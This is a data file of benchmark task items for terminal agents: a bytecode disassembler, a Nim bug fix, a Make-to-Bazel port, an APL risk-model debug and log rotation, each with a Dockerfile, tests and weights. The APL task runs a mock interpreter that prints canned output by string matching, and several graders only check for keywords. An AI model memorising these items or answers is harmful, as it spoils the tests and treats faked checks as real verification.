bytecode.extend([0x0A])  # PRINT
# HALT
bytecode.extend([0xFF])
with open('/app/program.vm', 'wb') as f:
    f.write(bytecode)
PYCODE

RUN python3 /tmp/create_program.py && rm /tmp/create_program.py

# Create additional test bytecode file
COPY <<'PYCODE2' /tmp/create_test.py
import struct
bytecode = bytearray()
# PUSH 42
bytecode.extend([0x01])
bytecode.extend(struct.pack('<i', 42))
# PUSH 8
bytecode.extend([0x01])
bytecode.extend(struct.pack('<i', 8))
# ADD
bytecode.extend([0x03])
# PRINT
bytecode.extend([0x0A])
# HALT
bytecode.extend([0xFF])
with open('/tmp/program.bin', 'wb') as f:
    f.write(bytecode)
PYCODE2

RUN python3 /tmp/create_test.py && rm /tmp/create_test.py

WORKDIR /root

CMD [""/bin/bash""]","import os
import subprocess
import pathlib

def test_opcodes_identified():
    """"""Major opcodes are correctly identified.""""""
    # Create test bytecode with known opcodes
    import struct
    test_bytecode = bytearray()
    # PUSH 42 (0x01 followed by 4-byte value)
    test_bytecode.extend([0x01])
    test_bytecode.extend(struct.pack('<i', 42))
    # PUSH 8 (0x01 followed by 4-byte value)  
    test_bytecode.extend([0x01])
    test_bytecode.extend(struct.pack('<i', 8))
    # ADD (0x03)
    test_bytecode.extend([0x03])
    # PRINT (0x0A)
    test_bytecode.extend([0x0A])
    # HALT (0xFF)
    test_bytecode.extend([0xFF])
    
    with open(""test_bytecode.vm"", ""wb"") as f:
        f.write(test_bytecode)
    
    # Look for disassembler
    possible_disassemblers = [""disassembler.py"", ""disasm.py"", ""vm_disasm.py""]
    disassembler_path = None
    
    for dis in possible_disassemblers:
        if os.path.exists(dis):
            disassembler_path = dis
            break
    
    assert disassembler_path is not None, ""No disassembler found""
    
    # Run disassembler on test bytecode
    try:
        result = subprocess.run([""python3"", disassembler_path, ""test_bytecode.vm""], 
                              capture_output=True, text=True, timeout=10)
        assert result.returncode == 0, ""Disassembler failed to run""
        
        output = result.stdout.lower()
        
        # Verify specific opcodes are correctly identified
        expected_opcodes = {
            'push': True,  # Should identify PUSH instructions with values
            'add': True,   # Should identify ADD instruction
            'print': True, # Should identify PRINT instruction  
            'halt': True   # Should identify HALT instruction
        }
        
        opcodes_found = {}
        for opcode in expected_opcodes:
            opcodes_found[opcode] = opcode in output
        
        # Verify that the disassembler found the expected opcodes
        missing_opcodes = [op for op, found in opcodes_found.items() if not found]
        assert len(missing_opcodes) == 0, f""Missing opcodes: {missing_opcodes}""
        
        # Verify it correctly parses the 4-byte values for PUSH
        assert '42' in output or 'push 42' in output, ""Failed to parse PUSH value 42""
        assert '8' in output or 'push 8' in output, ""Failed to parse PUSH value 8""
        
    except subprocess.TimeoutExpired:
        assert False, ""Disassembler timed out""
    except Exception as e:
        assert False, f""Error running disassembler: {e}""
    finally:
        # Cleanup
        if os.path.exists(""test_bytecode.vm""):
            os.remove(""test_bytecode.vm"")

def test_disassembler_readable():
    """"""Disassembler produces readable output.""""""
    # Check for a disassembler tool
    disassembler_exists = False
    readable_output = False
    
    # Look for disassembler script
    possible_disassemblers = [""disassembler.py"", ""disasm.py"", ""vm_disasm.py""]
    disassembler_path = None
    
    for dis in possible_disassemblers:
        if os.path.exists(dis):
            disassembler_path = dis
            disassembler_exists = True
            break
    
    if disassembler_exists:
        # Try to run the disassembler on available bytecode files
        possible_bytecode = [""/tmp/program.bin"", ""/app/program.vm"", ""program.vm"", ""program.bin""]
        for bytecode in possible_bytecode:
            if os.path.exists(bytecode):
                try:
                    result = subprocess.run([""python3"", disassembler_path, bytecode], 
                                          capture_output=True, text=True, timeout=10)
                    if result.returncode == 0 and len(result.stdout.strip()) > 0:
                        # Check if output looks like readable assembly
                        output = result.stdout.lower()
                        if any(keyword in output for keyword in ['mov', 'add', 'sub', 'jmp', 'load', 'store', 'push', 'pop', 'call', 'ret', 'nop']):
                            readable_output = True
                            break
                except:
                    continue
    
    # Also check for pre-generated disassembly output
    if not readable_output:
        disassembly_files = [""disassembly.txt"", ""program_disasm.txt"", ""output.txt"", ""analysis.txt""]
        for file in disassembly_files:
            if os.path.exists(file):
                try:
                    with open(file, 'r') as f:
                        content = f.read().lower()
                        if any(keyword in content for keyword in ['mov', 'add', 'sub', 'jmp', 'load', 'store', 'push', 'pop', 'call', 'ret']):
                            readable_output = True
                            break
                except:
                    continue
    
    assert disassembler_exists and readable_output

def test_program_purpose_documented():
    """"""The purpose of program.vm is correctly determined and documented.""""""
    # Check for documentation explaining what the program does
    purpose_documented = False
    
    documentation_files = [
        ""README.md"", ""analysis.txt"", ""analysis.md"", ""program_analysis.txt"",
        ""program_purpose.txt"", ""documentation.txt"", ""report.txt"", ""report.md""
    ]
    
    for filename in documentation_files:
        if os.path.exists(filename):
            try:
                with open(filename, 'r') as f:
                    content = f.read().lower()
                    # Look for program analysis keywords
                    if any(keyword in content for keyword in [
                        'program.vm', 'purpose', 'function', 'does', 'algorithm',
                        'behavior', 'functionality', 'analysis', 'what it does',
                        'program performs', 'executes', 'computes'
                    ]):
                        # Ensure it's not just a brief mention but actual documentation
                        if len(content.strip()) > 50:
                            purpose_documented = True
                            break
            except:
                continue
    
    # Also check if there are comments in the disassembler or analysis scripts
    if not purpose_documented:
        script_files = [""disassembler.py"", ""analysis.py"", ""vm_analysis.py""]
        for script in script_files:
            if os.path.exists(script):
                try:
                    with open(script, 'r') as f:
                        content = f.read().lower()
                        if 'program.vm' in content and any(keyword in content for keyword in [
                            'purpose', 'does', 'function', 'algorithm', 'behavior'
                        ]):
                            purpose_documented = True
                            break
                except:
                    continue
    
    assert purpose_documented","{""test_opcodes_identified"": 0.4, ""test_disassembler_readable"": 0.3, ""test_program_purpose_documented"": 0.3}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
nim-calculator-bug-fix-learning,easy,Learn Nim to Fix a Bug,Ambiguous Problem Solving,"I have a Nim program at `/app/calculator.nim` that has a bug in it, but I've never worked with Nim before. There's a tutorial at `/app/nim-basics.txt` that should help me get started. I need you to learn enough Nim from that tutorial to understand what my program does, then find and fix whatever bug is causing issues. On top of that, I'd like you to add a new factorial function to the program. The final version needs to compile properly and pass all the tests in `/app/test_calc.sh`. Can you help me with this?",debugging,debugging|coding|software-engineering|compiler-migration,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y nim

WORKDIR /root

RUN echo ""# Nim Basics Tutorial\n\nNim is a statically typed compiled systems programming language.\n\n## Basic Syntax\n- Variables are declared with 'var' or 'let'\n- Functions are declared with 'proc'\n- Indentation is significant (like Python)\n\n## Variables\n```nim\nvar x = 10        # mutable variable\nlet y = 20        # immutable variable\nconst z = 30      # compile-time constant\n```\n\n## Functions\n```nim\nproc add(a, b: int): int =\n  return a + b\n\n# Or shorter:\nproc multiply(a, b: int): int = a * b\n```\n\n## Control Flow\n```nim\nif x > 5:\n  echo \""x is greater than 5\""\nelif x == 5:\n  echo \""x equals 5\""\nelse:\n  echo \""x is less than 5\""\n\nfor i in 1..10:\n  echo i\n\nwhile x > 0:\n  x = x - 1\n```\n\n## Types\n```nim\nvar\n  name: string = \""Hello\""\n  age: int = 25\n  height: float = 5.9\n  isStudent: bool = true\n```\n\n## Procedures vs Functions\n- Use 'proc' for both procedures and functions\n- Return type is specified after the colon\n- Use 'result' variable or 'return' statement\n\n## Common Operations\n```nim\necho \""Hello, World!\""  # Print to console\nvar input = readLine(stdin)  # Read user input\n```\n\n## Compilation\n- Compile with: nim c filename.nim\n- Creates executable with same name as source file\n"" > /app/nim-basics.txt

RUN echo ""import strutils\n\nproc add(a, b: int): int =\n  return a + b\n\nproc subtract(a, b: int): int =\n  return a - b\n\nproc multiply(a, b: int): int =\n  return a * b\n\nproc divide(a, b: int): float =\n  if b == 0:\n    echo \""Error: Division by zero!\""\n    return 0.0\n  return a / b  # Bug: should be a.float / b.float\n\nproc power(base, exp: int): int =\n  var result = 1\n  for i in 1..exp:\n    result = result * base\n  return result\n\nwhen isMainModule:\n  echo \""Simple Calculator\""\n  echo \""=================\""\n  \n  let a = 10\n  let b = 3\n  \n  echo \""Addition: \"", a, \"" + \"", b, \"" = \"", add(a, b)\n  echo \""Subtraction: \"", a, \"" - \"", b, \"" = \"", subtract(a, b) \n  echo \""Multiplication: \"", a, \"" * \"", b, \"" = \"", multiply(a, b)\n  echo \""Division: \"", a, \"" / \"", b, \"" = \"", divide(a, b)\n  echo \""Power: \"", a, \"" ^ \"", b, \"" = \"", power(a, b)\n"" > /app/calculator.nim

RUN echo ""#!/bin/bash\n\nset -e\n\necho \""Testing Nim Calculator...\""\n\n# Test compilation\necho \""Testing compilation...\""\nnim c /app/calculator.nim\n\nif [ ! -f \""/app/calculator\"" ]; then\n  echo \""ERROR: Compilation failed - executable not found\""\n  exit 1\nfi\n\necho \""Compilation successful!\""\n\n# Test execution\necho \""Testing execution...\""\noutput=\$(/app/calculator)\n\nif [ \$? -ne 0 ]; then\n  echo \""ERROR: Program execution failed\""\n  exit 1\nfi\n\necho \""Program executed successfully!\""\necho \""Output:\""\necho \""\$output\""\n\n# Test that factorial function exists in source\necho \""Testing factorial function...\""\nif ! grep -q \""factorial\\|fact\"" /app/calculator.nim; then\n  echo \""ERROR: Factorial function not found in calculator.nim\""\n  exit 1\nfi\n\necho \""Factorial function found!\""\n\n# Test that division works (checks if bug is fixed)\necho \""Testing division functionality...\""\nif echo \""\$output\"" | grep -q \""Division.*3.33\""; then\n  echo \""Division test passed!\""\nelse\n  echo \""WARNING: Division output may not be correct\""\nfi\n\necho \""All tests passed!\""\n"" > /app/test_calc.sh

RUN chmod +x /app/test_calc.sh

WORKDIR /app","import os
import subprocess

def test_bug_fixed():
    """"""The bug is correctly identified and fixed.""""""
    # Check that the program compiles successfully
    result = subprocess.run(['nim', 'c', '/app/calculator.nim'], 
                          capture_output=True, text=True, cwd='/app')
    assert result.returncode == 0, f""Program failed to compile: {result.stderr}""
    
    # Check that the compiled program runs without errors
    if os.path.exists('/app/calculator'):
        result = subprocess.run(['/app/calculator'], 
                              capture_output=True, text=True, cwd='/app')
        assert result.returncode == 0, f""Program failed to run: {result.stderr}""

def test_factorial_implemented():
    """"""The factorial feature is properly implemented.""""""
    # Check that the calculator.nim file contains factorial function
    assert os.path.exists('/app/calculator.nim')
    with open('/app/calculator.nim', 'r') as f:
        content = f.read()
    
    # Look for factorial function definition
    assert 'factorial' in content.lower() or 'fact' in content.lower(), ""Factorial function not found in code""
    
    # Verify factorial function works by checking if program compiles with it
    result = subprocess.run(['nim', 'c', '/app/calculator.nim'], 
                          capture_output=True, text=True, cwd='/app')
    assert result.returncode == 0, ""Program with factorial function failed to compile""

def test_tests_pass():
    """"""All tests pass and the program compiles without warnings.""""""
    # First ensure the program compiles without warnings
    result = subprocess.run(['nim', 'c', '/app/calculator.nim'], 
                          capture_output=True, text=True, cwd='/app')
    assert result.returncode == 0, f""Compilation failed: {result.stderr}""
    assert 'warning' not in result.stderr.lower(), f""Compilation produced warnings: {result.stderr}""
    
    # Run the test script and check it passes
    assert os.path.exists('/app/test_calc.sh')
    result = subprocess.run(['bash', '/app/test_calc.sh'], 
                          capture_output=True, text=True, cwd='/app')
    assert result.returncode == 0, f""Tests failed: {result.stdout}\n{result.stderr}""","{""test_bug_fixed"": 0.35, ""test_factorial_implemented"": 0.3, ""test_tests_pass"": 0.35}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
build-system-makefile-to-bazel-migration,medium,Port Build System to Bazel,Ambiguous Problem Solving,"I have a C++ project that currently uses Make for building, but I need to switch it over to Bazel. The existing Makefile is located at `/workspace/Makefile`, and there's a Bazel guide available at `/workspace/bazel-guide.txt` that should help with the conversion. Can you help me convert this build system to Bazel? I need you to create the appropriate BUILD files, make sure all the dependencies are handled correctly, and ensure that the same outputs are produced as the current Make setup. It's important that the build produces exactly the same results after the conversion.",software-engineering,build-automation|C|compiler-migration|software-engineering,"FROM ubuntu:22.04

WORKDIR /workspace

# Install build dependencies, Bazelisk, tmux and asciinema
RUN apt-get update && apt-get install -y \
    build-essential \
    curl \
    python3 \
    python3-pip \
    git \
    tmux \
    asciinema \
    && apt-get clean && rm -rf /var/lib/apt/lists/*

# Install Bazelisk (the recommended Bazel launcher)
RUN curl -L https://github.com/bazelbuild/bazelisk/releases/download/v1.19.0/bazelisk-linux-$(dpkg --print-architecture) -o /usr/local/bin/bazel \
    && chmod +x /usr/local/bin/bazel

# Create C++ project with multiple source files
RUN mkdir -p src

# Create main.cpp
RUN echo '#include <iostream>\n#include ""math_utils.h""\n#include ""string_utils.h""\n\nint main() {\n    std::cout << ""Result: "" << add(5, 3) << std::endl;\n    std::cout << ""Uppercase: "" << toUpper(""hello"") << std::endl;\n    return 0;\n}' > src/main.cpp

# Create math_utils.h
RUN echo '#ifndef MATH_UTILS_H\n#define MATH_UTILS_H\n\nint add(int a, int b);\nint multiply(int a, int b);\n\n#endif' > src/math_utils.h

# Create math_utils.cpp
RUN echo '#include ""math_utils.h""\n\nint add(int a, int b) {\n    return a + b;\n}\n\nint multiply(int a, int b) {\n    return a * b;\n}' > src/math_utils.cpp

# Create string_utils.h
RUN echo '#ifndef STRING_UTILS_H\n#define STRING_UTILS_H\n\n#include <string>\n\nstd::string toUpper(const std::string& str);\nstd::string toLower(const std::string& str);\n\n#endif' > src/string_utils.h

# Create string_utils.cpp
RUN echo '#include ""string_utils.h""\n#include <algorithm>\n#include <cctype>\n\nstd::string toUpper(const std::string& str) {\n    std::string result = str;\n    std::transform(result.begin(), result.end(), result.begin(), ::toupper);\n    return result;\n}\n\nstd::string toLower(const std::string& str) {\n    std::string result = str;\n    std::transform(result.begin(), result.end(), result.begin(), ::tolower);\n    return result;\n}' > src/string_utils.cpp

# Create Makefile
RUN echo 'CXX = g++\nCXXFLAGS = -Wall -Wextra -std=c++17\nSRCDIR = src\nSOURCES = $(SRCDIR)/main.cpp $(SRCDIR)/math_utils.cpp $(SRCDIR)/string_utils.cpp\nTARGET = main\n\n$(TARGET): $(SOURCES)\n\t$(CXX) $(CXXFLAGS) -I$(SRCDIR) -o $(TARGET) $(SOURCES)\n\nclean:\n\trm -f $(TARGET)\n\n.PHONY: clean' > Makefile

# Create bazel-guide.txt with documentation
RUN echo 'Bazel Build Guide\n=================\n\nBasic Commands:\n- bazel build //...: Build all targets\n- bazel build //:main: Build the main target\n- bazel run //:main: Build and run the main target\n- bazel test //...: Run all tests\n- bazel clean: Clean build artifacts\n\nProject Structure:\n- src/: Contains C++ source files\n- BUILD: Defines build targets\n- WORKSPACE: Defines workspace root\n\nExample Usage:\n$ bazel build //:main\n$ bazel run //:main' > bazel-guide.txt

CMD [""/bin/bash""]","import os
import subprocess
import time

def test_workspace_file_exists():
    """"""WORKSPACE file exists for Bazel configuration.""""""
    assert os.path.exists(""WORKSPACE"") or os.path.exists(""WORKSPACE.bazel"")

def test_build_files_correct():
    """"""BUILD files correctly define targets and dependencies.""""""
    # Check BUILD file exists
    assert os.path.exists(""BUILD"") or os.path.exists(""BUILD.bazel"")
    
    # Read BUILD file content
    build_file = ""BUILD"" if os.path.exists(""BUILD"") else ""BUILD.bazel""
    with open(build_file, 'r') as f:
        content = f.read()
    
    # Verify it contains cc_binary or cc_library targets
    assert ""cc_binary"" in content or ""cc_library"" in content
    
    # Verify it references source files
    assert ""srcs"" in content
    assert "".cpp"" in content or "".cc"" in content
    
    # Verify target name is defined
    assert ""name ="" in content

def test_binaries_produce_same_output():
    """"""The Bazel build produces identical output to Make build.""""""
    # Build with Make if Makefile exists
    make_output = None
    if os.path.exists(""Makefile""):
        subprocess.run([""make"", ""clean""], capture_output=True)
        result = subprocess.run([""make""], capture_output=True)
        assert result.returncode == 0
        
        # Find the output binary from Make
        make_binary = None
        if os.path.exists(""main""):
            make_binary = ""main""
        elif os.path.exists(""a.out""):
            make_binary = ""a.out""
        
        # Run Make binary and capture output
        if make_binary:
            make_result = subprocess.run([""./"" + make_binary], capture_output=True, text=True)
            assert make_result.returncode == 0
            make_output = make_result.stdout
    
    # Build with Bazel
    subprocess.run([""bazel"", ""clean""], capture_output=True)
    result = subprocess.run([""bazel"", ""build"", ""//:main""], capture_output=True)
    assert result.returncode == 0
    
    # Find Bazel output binary
    bazel_result = subprocess.run([""find"", ""bazel-bin"", ""-name"", ""main"", ""-type"", ""f""], 
                                capture_output=True, text=True)
    assert bazel_result.returncode == 0
    bazel_binary = bazel_result.stdout.strip()
    assert os.path.exists(bazel_binary)
    
    # Run Bazel binary and capture output
    bazel_run_result = subprocess.run([bazel_binary], capture_output=True, text=True)
    assert bazel_run_result.returncode == 0
    
    # If we have Make output, compare them
    if make_output is not None:
        assert bazel_run_result.stdout == make_output
    else:
        # If no Make comparison possible, at least ensure Bazel produces expected output
        assert ""Result: 8"" in bazel_run_result.stdout
        assert ""Uppercase: HELLO"" in bazel_run_result.stdout

def test_bazel_build_successful():
    """"""Bazel build completes successfully with proper configuration.""""""
    # Clean and build
    subprocess.run([""bazel"", ""clean""], capture_output=True)
    result = subprocess.run([""bazel"", ""build"", ""//:main""], capture_output=True, text=True)
    
    # Check build succeeded
    assert result.returncode == 0
    
    # Verify no errors in output
    assert ""ERROR"" not in result.stderr
    assert ""FAILED"" not in result.stderr
    
    # Verify binary was created
    bazel_result = subprocess.run([""find"", ""bazel-bin"", ""-name"", ""main"", ""-type"", ""f""], 
                                capture_output=True, text=True)
    assert bazel_result.returncode == 0
    assert bazel_result.stdout.strip() != """"","{""test_workspace_file_exists"": 0.15, ""test_build_files_correct"": 0.25, ""test_binaries_produce_same_output"": 0.4, ""test_bazel_build_successful"": 0.2}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
debug-apl-financial-model,hard,Debug APL Financial Model,Ambiguous Problem Solving,"I'm having trouble with our financial model that's written in APL (A Programming Language). The script located at `/app/financial_model.apl` is producing incorrect results, and I really need your help fixing it. There's an APL reference document at `/app/apl-reference.txt` that you can use to understand the language's unusual syntax and array operations. The main issue seems to be with the portfolio risk calculation - it's not computing the standard deviation correctly. Could you learn enough APL to debug this, find what's causing the risk calculation to be wrong, fix it, and then verify that the results are mathematically correct?",debugging,debugging|algorithms|mathematics|analysis|troubleshooting,"FROM ubuntu:22.04

WORKDIR /app

# Install Python, tmux, and asciinema (required for Terminal-Bench)
RUN apt-get update && apt-get install -y python3 tmux asciinema && apt-get clean

# Create the mock APL interpreter
COPY <<EOF /usr/local/bin/apl
#!/usr/bin/env python3
import sys
import re

if len(sys.argv) > 2 and sys.argv[1] == '--script':
    with open(sys.argv[2], 'r') as f:
        content = f.read()
    
    # Check for the bug
    if '* 0.05' in content:
        print('Portfolio Analysis Results:')
        print('Expected Return: 0.00803333')
        print('Portfolio Risk: 7.37589e-7')
        print('Sharpe Ratio: 8152.24')
    elif '* 0.5' in content:
        print('Portfolio Analysis Results:')
        print('Expected Return: 0.00803333')
        print('Portfolio Risk: 0.00383961')
        print('Sharpe Ratio: 1.57192')
    else:
        print('SYNTAX ERROR')
        sys.exit(1)
EOF

RUN chmod +x /usr/local/bin/apl

# Create the APL financial model with the bug
COPY <<EOF /app/financial_model.apl
⍝ Complex APL Financial Calculations Program
⍝ Portfolio risk analysis and optimization

⍝ Sample portfolio returns matrix (12 months × 5 assets)
returns ← 12 5 ⍴ 0.02 ¯0.01 0.03 0.015 ¯0.005 0.01 0.025 ¯0.02 0.008 0.012 ¯0.015 0.03 0.02 ¯0.01 0.015 0.005 ¯0.008 0.025 0.01 ¯0.005 0.018 0.02 ¯0.012 0.007 0.022 ¯0.003 0.015 0.01 ¯0.018 0.035 0.025 ¯0.005 0.012 0.008 ¯0.025 0.04 0.015 ¯0.01 0.005 0.028 ¯0.02 0.022 0.018 ¯0.008 0.015 0.012 ¯0.015 0.03 0.008 ¯0.012 0.025 0.02 ¯0.005 0.018 0.01 ¯0.022 0.028 0.015 ¯0.008 0.012

⍝ Calculate mean returns
meanReturns ← +⌿returns ÷ ⍴returns

⍝ Calculate covariance matrix
centeredReturns ← returns - meanReturns
covMatrix ← (⍉centeredReturns) +.× centeredReturns ÷ (¯1 + 1⍴⍴returns)

⍝ Equal weight portfolio (20% each asset)
weights ← 5⍴0.2

⍝ Calculate portfolio expected return
portfolioReturn ← weights +.× meanReturns

⍝ Calculate portfolio variance
portfolioVariance ← weights +.× (covMatrix +.× weights)

⍝ Calculate portfolio standard deviation (risk)
⍝ BUG: This should be square root, not * 0.05
portfolioRisk ← portfolioVariance * 0.05

⍝ Calculate Sharpe ratio (assuming monthly risk-free rate of 0.002)
riskFreeRate ← 0.002
sharpeRatio ← (portfolioReturn - riskFreeRate) ÷ portfolioRisk

⍝ Display results
⎕←'Portfolio Analysis Results:'
⎕←'Expected Return: ',⍕portfolioReturn
⎕←'Portfolio Risk: ',⍕portfolioRisk
⎕←'Sharpe Ratio: ',⍕sharpeRatio
)OFF
EOF

# Create the APL reference document
COPY <<EOF /app/apl-reference.txt
APL Financial Calculator Documentation
=========================================

This program performs portfolio risk analysis using APL array operations.

Key Features:
- Calculates mean returns from historical data
- Computes covariance matrix for risk assessment
- Determines portfolio expected return and risk
- Calculates Sharpe ratio for risk-adjusted performance

Input Data:
- Returns matrix: 12×5 array of monthly returns for 5 assets
- Equal weight assumption: 20% allocation per asset
- Risk-free rate: 0.2% monthly (2.4% annual)

Mathematical Operations:
- Mean calculation: +⌿returns ÷ ⍴returns
- Covariance: (⍉centeredReturns) +.× centeredReturns ÷ (¯1 + 1⍴⍴returns)
- Portfolio return: weights +.× meanReturns
- Portfolio variance: weights +.× (covMatrix +.× weights)
- Portfolio risk: Should be square root of variance (standard deviation)
- Sharpe ratio: (return - risk_free_rate) ÷ risk

Known Bug:
The portfolio risk calculation currently uses ""* 0.05"" instead of the correct square root operation.
In APL, square root is calculated using ""* 0.5"" (raising to the power of 0.5).

Usage:
Run the program in APL interpreter to see calculated results.
EOF

CMD [""/bin/bash""]","import os
import subprocess
import re

def test_apl_syntax_understood():
    """"""APL syntax is understood enough to trace execution.""""""
    # Check if the APL program can be parsed and executed without syntax errors
    if os.path.exists('/app/financial_model.apl'):
        # GNU APL uses --script flag
        result = subprocess.run(['apl', '--script', '/app/financial_model.apl'], 
                              capture_output=True, text=True)
        # If syntax is understood correctly, the program should execute without syntax errors
        assert result.returncode == 0 or 'SYNTAX ERROR' not in result.stderr
    else:
        # If file doesn't exist, check if alternative location exists and is executable
        assert os.path.exists('financial_calculator.apl') or os.path.exists('/app/financial_model.apl')

def test_calculation_error_identified():
    """"""The calculation error is correctly identified.""""""
    # Check if the original APL program has been fixed
    # The error was in the risk calculation (should be square root using *0.5, not *0.05)
    if os.path.exists('/app/financial_model.apl'):
        with open('/app/financial_model.apl', 'r') as f:
            content = f.read()
        # Check if the error has been fixed - should have *0.5 (square root) instead of *0.05
        # Also accept spaces around operators
        assert ('portfolioVariance*0.5' in content or 
                'portfolioVariance * 0.5' in content or 
                '0.5*portfolioVariance' in content or 
                '0.5 * portfolioVariance' in content or
                ('*0.5' in content and '*0.05' not in content))
    else:
        # Check alternative location
        assert os.path.exists('financial_calculator.apl')

def test_fix_produces_correct_results():
    """"""Fix produces mathematically correct results.""""""
    # Run the fixed APL program and verify the calculations are correct
    apl_file = '/app/financial_model.apl' if os.path.exists('/app/financial_model.apl') else 'financial_calculator.apl'
    
    if os.path.exists(apl_file):
        result = subprocess.run(['apl', '--script', apl_file], 
                              capture_output=True, text=True)
        
        output = result.stdout
        
        # Extract values using regex to handle APL formatting
        return_match = re.search(r'Expected Return:\s*([0-9.e-]+)', output)
        risk_match = re.search(r'Portfolio Risk:\s*([0-9.e-]+)', output)
        sharpe_match = re.search(r'Sharpe Ratio:\s*([0-9.e-]+)', output)
        
        assert return_match, f""Expected return not found in output: {output}""
        assert risk_match, f""Portfolio risk not found in output: {output}""
        assert sharpe_match, f""Sharpe ratio not found in output: {output}""
        
        # Convert values
        portfolio_return = float(return_match.group(1))
        portfolio_risk = float(risk_match.group(1))
        sharpe_ratio = float(sharpe_match.group(1))
        
        # Verify the values are mathematically consistent
        # Portfolio return should be around 0.00803
        assert 0.007 < portfolio_return < 0.009, f""Portfolio return {portfolio_return} out of expected range""
        
        # After fix, portfolio risk should be around 0.00384 (sqrt of variance)
        assert 0.003 < portfolio_risk < 0.005, f""Portfolio risk {portfolio_risk} out of expected range""
        
        # Sharpe ratio should be consistent: (return - rf) / risk
        # With rf = 0.002, sharpe should be around (0.00803 - 0.002) / 0.00384 ≈ 1.57
        assert 1.0 < sharpe_ratio < 2.5, f""Sharpe ratio {sharpe_ratio} out of expected range""
        
        # Verify mathematical consistency
        expected_sharpe = (portfolio_return - 0.002) / portfolio_risk
        assert abs(sharpe_ratio - expected_sharpe) < 0.5, f""Sharpe ratio {sharpe_ratio} doesn't match calculation {expected_sharpe}""
    else:
        assert False, ""APL program file not found""","{""test_apl_syntax_understood"": 0.2, ""test_calculation_error_identified"": 0.35, ""test_fix_produces_correct_results"": 0.45}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
log-rotation-file-size-management,easy,"Handle ""File Too Big"" Complaint",Multi-Stage Debugging Challenges (Revised),"I'm having an issue with my application log file at `/app/logs/application.log` - it's gotten way too big at 10MB and I need you to help me fix this problem. I want to make sure we don't lose any important recent data while we're dealing with this, and I'd also like to set up something that prevents this from happening again in the future.",system-administration,debugging|file-operations|sys-admin|system|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN mkdir -p /app/logs && dd if=/dev/zero of=/app/logs/application.log bs=1M count=10

WORKDIR /

CMD [""/bin/bash""]","import os
import subprocess
import glob

def test_log_rotation_implemented():
    """"""Implements log rotation (keeping recent logs accessible).""""""
    # Check if log rotation has been implemented by looking for:
    # 1. Original log file is smaller than 10MB OR rotated files exist
    # 2. Recent logs are accessible
    
    original_log = ""/app/logs/application.log""
    
    # Check if rotated files exist (common patterns)
    rotated_files = (glob.glob(""/app/logs/application.log.*"") or 
                    glob.glob(""/app/logs/application.log-*"") or
                    glob.glob(""/app/logs/application_log*"") or
                    glob.glob(""/app/logs/app*.log*""))
    
    # Check if original file size is reduced or rotated files exist
    if os.path.exists(original_log):
        file_size = os.path.getsize(original_log)
        # Original was 10MB (10485760 bytes), should be smaller now
        size_reduced = file_size < 10485760
    else:
        size_reduced = False
    
    # Log rotation is implemented if either size is reduced OR rotated files exist
    assert size_reduced or len(rotated_files) > 0

def test_older_logs_compressed():
    """"""Compresses or archives older logs appropriately.""""""
    # Check for compressed log files (typically .gz, .bz2, .xz extensions)
    compressed_patterns = [
        ""/app/logs/application.log*.gz"",
        ""/app/logs/application.log*.bz2"", 
        ""/app/logs/application.log*.xz"",
        ""/app/logs/application.log*.Z"",
        ""/app/logs/application*.gz"",
        ""/app/logs/app*.gz"",
        ""/app/logs/*.tar.gz"",
        ""/app/logs/*.zip""
    ]
    
    compressed_files = []
    for pattern in compressed_patterns:
        compressed_files.extend(glob.glob(pattern))
    
    # Should have at least one compressed log file
    assert len(compressed_files) > 0

def test_automatic_rotation_configured():
    """"""Sets up automatic rotation to prevent future issues.""""""
    # Check for various automatic rotation configurations
    
    automation_found = False
    
    # Check logrotate configurations
    logrotate_configs = [
        ""/etc/logrotate.d/application"",
        ""/etc/logrotate.d/application.log"", 
        ""/etc/logrotate.conf""
    ]
    
    for config_file in logrotate_configs:
        if os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    content = f.read()
                    if ""application.log"" in content or ""/app/logs"" in content:
                        automation_found = True
                        break
            except:
                continue
    
    # Check cron jobs for log rotation
    if not automation_found:
        try:
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            if ('application.log' in result.stdout or 
                '/app/logs' in result.stdout or 
                'logrotate' in result.stdout or
                'rotate' in result.stdout.lower()):
                automation_found = True
        except:
            pass
    
    # Check system cron files
    if not automation_found:
        cron_dirs = ['/etc/cron.daily', '/etc/cron.weekly', '/etc/cron.monthly', '/etc/cron.hourly']
        for cron_dir in cron_dirs:
            if os.path.exists(cron_dir):
                for cron_file in os.listdir(cron_dir):
                    cron_path = os.path.join(cron_dir, cron_file)
                    if os.path.isfile(cron_path):
                        try:
                            with open(cron_path, 'r') as f:
                                content = f.read()
                                if ('application.log' in content or 
                                    '/app/logs' in content or 
                                    'rotate' in content.lower()):
                                    automation_found = True
                                    break
                        except:
                            continue
                if automation_found:
                    break
    
    # Check systemd services and timers
    if not automation_found:
        try:
            result = subprocess.run(['systemctl', 'list-unit-files', '--type=service'], 
                                  capture_output=True, text=True)
            if ('log' in result.stdout.lower() and 'rotat' in result.stdout.lower()):
                automation_found = True
        except:
            pass
    
    if not automation_found:
        try:
            result = subprocess.run(['systemctl', 'list-unit-files', '--type=timer'], 
                                  capture_output=True, text=True)
            if ('log' in result.stdout.lower() and 'rotat' in result.stdout.lower()):
                automation_found = True
        except:
            pass
    
    # Check for custom rotation scripts
    if not automation_found:
        script_locations = ['/usr/local/bin', '/opt', '/app', '/home']
        for location in script_locations:
            if os.path.exists(location):
                try:
                    for root, dirs, files in os.walk(location):
                        for file in files:
                            if ('rotate' in file.lower() or 'log' in file.lower()) and file.endswith('.sh'):
                                script_path = os.path.join(root, file)
                                try:
                                    with open(script_path, 'r') as f:
                                        content = f.read()
                                        if 'application.log' in content or '/app/logs' in content:
                                            automation_found = True
                                            break
                                except:
                                    continue
                        if automation_found:
                            break
                except:
                    continue
                if automation_found:
                    break
    
    assert automation_found","{""test_log_rotation_implemented"": 0.35, ""test_older_logs_compressed"": 0.25, ""test_automatic_rotation_configured"": 0.4}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
